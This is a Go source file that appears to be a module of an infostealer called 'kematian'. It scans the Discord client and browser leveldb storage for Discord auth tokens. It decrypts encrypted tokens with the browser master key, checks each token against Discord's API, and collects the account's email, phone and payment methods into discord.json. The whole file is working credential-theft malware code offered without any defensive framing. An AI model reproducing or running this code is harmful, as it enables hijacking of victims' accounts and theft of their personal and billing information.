package discord

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"kdot/kematian/browsers/structs"
	"kdot/kematian/decryption"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var baseurl string = "https://discord.com/api/v9/users/@me"

var roaming string = os.Getenv("APPDATA")

type Response struct {
	ID            string `json:"id"`
	USERNAME      string `json:"username"`
	DISCRIMINATOR string `json:"discriminator"`
	EMAIL         string `json:"email"`
	PHONE         string `json:"phone"`
}

type Tokens struct {
	TOKEN         string `json:"token"`
	ID            string `json:"id"`
	USERNAME      string `json:"username"`
	DISCRIMINATOR string `json:"discriminator"`
	EMAIL         string `json:"email"`
	PHONE         string `json:"phone"`
	BILLING       string `json:"billing"`
}

type Billing struct {
	TYPE string `json:"type"`
}

var token_paths = []string{
	roaming + "\\discord\\Local Storage\\leveldb\\",
	roaming + "\\discordcanary\\Local Storage\\leveldb\\",
	roaming + "\\discordptb\\Local Storage\\leveldb\\",
}

func GetTokens(goodBrowsers []structs.Browser) string {
	var to_return []Tokens
	var tokens_current []string
	var final_tokens []string
	for _, path := range token_paths {
		if _, err := os.Stat(path); err == nil {
			files_out, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, file := range files_out {
				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {

					data, err := os.ReadFile(path + file.Name())
					if err != nil {
						continue
					}

					normal_regex_mem, err := regexp.Compile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
					if err == nil {
						if string(normal_regex_mem.Find(data)) != "" {
							t := string(normal_regex_mem.Find(data))
							tokens_current = append(tokens_current, t)
						}
					}

					encrypted_regex_mem, err := regexp.Compile(`dQw4w9WgXcQ:[^\"]*`)
					if err == nil {
						if string(encrypted_regex_mem.Find(data)) != "" {
							t := string(encrypted_regex_mem.Find(data))
							good_code := strings.Split(t, ":")[1]
							decoded, err := base64.StdEncoding.DecodeString(good_code)
							if err != nil {
								continue
							}
							good_dir_local_state := strings.Split(path, "\\")

							first6 := good_dir_local_state[:6]
							result := strings.Join(first6, "\\") + "\\Local State"
							good_key := decryption.GetMasterKey(result)
							decrypted, _ := decryption.DecryptPassword(decoded, good_key)
							tokens_current = append(tokens_current, decrypted)
						}
					}
				}
			}
		} else {
			continue
		}
	}

	for _, browser := range goodBrowsers {
		for _, profile := range browser.Profiles {
			goodPath := filepath.Join(profile.NameAndPath, "Local Storage", "leveldb", "*.ldb")
			goodPath2 := filepath.Join(profile.NameAndPath, "Local Storage", "leveldb", "*.log")

			ldbFiles, err := filepath.Glob(goodPath)
			if err != nil {
				continue
			}

			ldbFiles2, err := filepath.Glob(goodPath2)
			if err != nil {
				continue
			}

			appendFiles := append(ldbFiles, ldbFiles2...)

			for _, ldbLog := range appendFiles {
				data, err := os.ReadFile(ldbLog)
				if err != nil {
					continue
				}
				normal_regex_mem, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}`)
				if err == nil {
					if string(normal_regex_mem.Find(data)) != "" {
						t := string(normal_regex_mem.Find(data))
						tokens_current = append(tokens_current, t)
					}
				}

				encrypted_regex_mem, err := regexp.Compile(`dQw4w9WgXcQ:[^\"]*`)
				if err == nil {
					if string(encrypted_regex_mem.Find(data)) != "" {
						t := string(encrypted_regex_mem.Find(data))
						good_code := strings.Split(t, ":")[1]
						decoded, err := base64.StdEncoding.DecodeString(good_code)
						if err != nil {
							continue
						}
						good_dir_local_state := browser.LocalState
						good_key := decryption.GetMasterKey(good_dir_local_state)
						decrypted, _ := decryption.DecryptPassword(decoded, good_key)
						tokens_current = append(tokens_current, decrypted)
					}
				}
			}
		}
	}

	for _, token := range tokens_current {

		if CheckToken(token) {
			final_tokens = append(final_tokens, token)
		}
	}
	//remove duplicates
	final_tokens = removeDuplicates(final_tokens)
	for _, token := range final_tokens {
		to_return = append(to_return, GetTokenInfo(token))
	}

	jsonData, err := json.MarshalIndent(to_return, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}

func removeDuplicates(elements []string) []string {
	encountered := map[string]bool{}
	result := []string{}

	for v := range elements {
		if encountered[elements[v]] {
		} else {
			encountered[elements[v]] = true
			result = append(result, elements[v])
		}
	}
	return result
}

func CheckToken(token string) bool {
	req, err := http.NewRequest("GET", baseurl, nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", token)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	if resp.StatusCode == 200 {
		return true
	}
	return false
}

func GetTokenInfo(token string) Tokens {
	client := http.Client{}

	// Create a new request
	req, err := http.NewRequest("GET", baseurl, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return Tokens{}
	}

	// Set request headers
	req.Header.Set("Authorization", token)

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return Tokens{}
	}
	defer resp.Body.Close()

	// Read the response body and assign it to they're respective variables
	var response Response
	err = json.NewDecoder(resp.Body).Decode(&response)
	if err != nil {
		fmt.Println("Error decoding response:", err)
		return Tokens{}
	}

	//username := (*mapped)["USERNAME"] + "#" + (*mapped)["DISCRIMINATOR"]
	username := response.USERNAME + "#" + response.DISCRIMINATOR
	user_id := response.ID
	email := response.EMAIL
	phone := response.PHONE
	billing := getBilling(token)
	return Tokens{TOKEN: token, ID: user_id, USERNAME: username, EMAIL: email, PHONE: phone, BILLING: billing}
}

func WriteDiscordInfo(goodBrowsers []structs.Browser) {
	os.WriteFile("discord.json", []byte(GetTokens(goodBrowsers)), 0644)
}

func getBilling(token string) string {
	client := http.Client{}
	url := "https://discord.com/api/v6/users/@me/billing/payment-sources"
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "Error Checking Billing"
	}
	req.Header.Set("Authorization", token)
	resp, err := client.Do(req)
	if err != nil {
		return "Error Checking Billing"
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return "Error Checking Billing"
	}
	var billing []map[string]interface{}
	err = json.Unmarshal(body, &billing)
	if err != nil {
		fmt.Println("Error parsing JSON:", err)
		return "Error Checking Billing"
	}
	var paymentMethods []string
	for _, method := range billing {
		methodType := int(method["type"].(float64))
		if methodType == 1 {
			paymentMethods = append(paymentMethods, "Card")
		} else if methodType == 2 {
			paymentMethods = append(paymentMethods, "PayPal")
		} else if methodType == 17 {
			paymentMethods = append(paymentMethods, "Cashapp")
		} else {
			paymentMethods = append(paymentMethods, "Idk Lmao")
		}
	}
	result := strings.Join(paymentMethods, ", ")

	if result == "" {
		return "No Billing Info"
	}
	return result
}
